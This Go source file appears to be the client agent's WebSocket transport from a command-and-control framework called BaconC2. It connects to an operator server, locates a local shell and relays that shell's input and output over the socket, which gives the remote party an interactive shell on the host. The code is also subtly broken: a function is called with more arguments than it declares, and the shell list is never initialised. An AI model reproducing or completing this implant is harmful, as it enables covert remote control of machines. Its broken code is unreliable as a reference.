package transport

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strings"
	"sync"

	"github.com/RabbITCybErSeC/BaconC2/client/models"
	"github.com/gorilla/websocket"
)

const (
	wsShellPath = "%s/ws/api/agents/shell?id=%s"
)

type WebSocketTransport struct {
	serverURL string
	agentID   string
	conn      *websocket.Conn
	ctx       context.Context
	cancel    context.CancelFunc
	mutex     sync.Mutex
	shells    []string
}

func NewWebSocketTransport(serverURL, agentID string) models.IStreamingTransport {
	ctx, cancel := context.WithCancel(context.Background())
	return &WebSocketTransport{
		serverURL: serverURL,
		agentID:   agentID,
		ctx:       ctx,

		cancel: cancel,
	}
}

func (t *WebSocketTransport) StartStreamingSession(sessionType string, config models.StreamingConfig, resultChan chan<- models.CommandResult) error {
	if sessionType != "shell" {
		err := fmt.Errorf("unsupported session type: %s", sessionType)
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": err.Error()},
		}
		return err
	}

	shellType := config.ShellType
	if shellType == models.ShellTypeUnknown {
		err := fmt.Errorf("invalid shell type: %s", shellType)
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": err.Error()},
		}
		return err
	}

	// Establish WebSocket connection
	wsURL := fmt.Sprintf(wsShellPath, t.serverURL, t.agentID)
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to connect to WebSocket: %v", err)},
		}
		return fmt.Errorf("failed to connect to WebSocket: %w", err)
	}

	t.mutex.Lock()
	t.conn = conn
	t.mutex.Unlock()

	// Start shell process
	cmd, err := t.startShellProcess(shellType, config)
	if err != nil {
		t.CloseSession("shell")
		resultChan <- models.CommandResult{
			ID:     "session_start",
			Status: "error",
			Output: map[string]string{"error": fmt.Sprintf("Failed to start shell: %v", err)},
		}
		return fmt.Errorf("failed to start shell: %w", err)
	}

	go t.handleShellSession(cmd, resultChan, config)

	resultChan <- models.CommandResult{
		ID:     "session_start",
		Status: "success",
		Output: map[string]string{"message": "Shell session started"},
	}
	return nil
}

func (t *WebSocketTransport) initShells() {
	goodShells := []string{"zsh", "bash", "fish", "sh"}
	potentialShells := []string{}

	// Try known good shells
	for _, shell := range goodShells {
		if path, err := exec.LookPath(shell); err == nil {
			potentialShells = append(potentialShells, path)
		}
	}

	// If none found, try /etc/shells
	if len(potentialShells) == 0 {
		if shells, err := getSystemShells(); err == nil {
			potentialShells = append(potentialShells, shells...)
		} else {
			// Last resort: common paths
			for _, shell := range goodShells {
				potentialShells = append(potentialShells,
					path.Join("/opt/bin/", shell),
					path.Join("/opt/", shell),
					path.Join("/usr/local/bin/", shell),
					path.Join("/usr/local/sbin/", shell),
					path.Join("/usr/bin/", shell),
					path.Join("/bin/", shell),
					path.Join("/sbin/", shell),
				)
			}
		}
	}

	// Filter valid shells
	for _, s := range potentialShells {
		if stats, err := os.Stat(s); err == nil && !stats.IsDir() {
			t.shells = append(t.shells, s)
		}
	}
}

func getSystemShells() ([]string, error) {
	file, err := os.Open("/etc/shells")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	potentialShells := []string{}
	goodShells := map[string]bool{"zsh": true, "bash": true, "fish": true, "sh": true}

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if len(line) == 0 || line[0] == '#' {
			continue
		}
		if goodShells[filepath.Base(line)] {
			potentialShells = append(potentialShells, line)
		}
	}

	return potentialShells, scanner.Err()
}

func (t *WebSocketTransport) CloseSession(sessionID string) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	t.cancel()
	if t.conn != nil {
		err := t.conn.Close()
		t.conn = nil
		return err
	}
	return nil
}

func (t *WebSocketTransport) handleShellSession(cmd *exec.Cmd, resultChan chan<- models.CommandResult) {
	defer t.CloseSession("shell")
	defer cmd.Wait()

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("Failed to get stdout pipe: %v", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("Failed to get stderr pipe: %v", err)
		return
	}
	stdin, err := cmd.StdinPipe()
	if err != nil {
		log.Printf("Failed to get stdin pipe: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("Failed to start shell process: %v", err)
		return
	}

	// Read shell stdout
	go func() {
		buf := make([]byte, 1024)
		for {
			select {
			case <-t.ctx.Done():
				return
			default:
				n, err := stdout.Read(buf)
				if err != nil {
					log.Printf("Error reading stdout: %v", err)
					return
				}
				t.sendMessage(models.WebSocketMessage{
					Type: "output",
					Data: string(buf[:n]),
				})
			}
		}
	}()

	// Read shell stderr
	go func() {
		buf := make([]byte, 1024)
		for {
			select {
			case <-t.ctx.Done():
				return
			default:
				n, err := stderr.Read(buf)
				if err != nil {
					log.Printf("Error reading stderr: %v", err)
					return
				}
				t.sendMessage(models.WebSocketMessage{
					Type: "error",
					Data: string(buf[:n]),
				})
			}
		}
	}()

	// Read WebSocket messages
	for {
		select {
		case <-t.ctx.Done():
			return
		default:
			var msg models.WebSocketMessage
			t.mutex.Lock()
			if t.conn == nil {
				t.mutex.Unlock()
				return
			}
			err := t.conn.ReadJSON(&msg)
			t.mutex.Unlock()
			if err != nil {
				log.Printf("WebSocket read error: %v", err)
				return
			}
			if msg.Type == "input" {
				if _, err := stdin.Write([]byte(msg.Data)); err != nil {
					log.Printf("Error writing to shell stdin: %v", err)
					return
				}
			} else if msg.Type == "control" && msg.Data == "terminate" {
				return
			}
		}
	}
}

func (t *WebSocketTransport) sendMessage(msg models.WebSocketMessage) error {
	t.mutex.Lock()
	defer t.mutex.Unlock()
	if t.conn == nil {
		return fmt.Errorf("no WebSocket connection")
	}
	return t.conn.WriteJSON(msg)
}

func (t *WebSocketTransport) startShellProcess(shellType models.ShellType, config models.StreamingConfig) (*exec.Cmd, error) {
	shellPath := ""
	for _, shell := range t.shells {
		base := filepath.Base(shell)
		switch shellType {
		case models.ShellTypeBash:
			if base == "bash" {
				shellPath = shell
			}
		case models.ShellTypeSh:
			if base == "sh" {
				shellPath = shell
			}
		case models.ShellTypeZsh:
			if base == "zsh" {
				shellPath = shell
			}
		case models.ShellTypeFish:
			if base == "fish" {
				shellPath = shell
			}
		}
		if shellPath != "" {
			break
		}
	}

	if shellPath == "" {
		return nil, fmt.Errorf("no suitable shell found for type: %s", shellType)
	}

	cmd := exec.Command(shellPath)
	cmd.Env = append(os.Environ(), "TERM="+config.Term)
	return cmd, nil
}
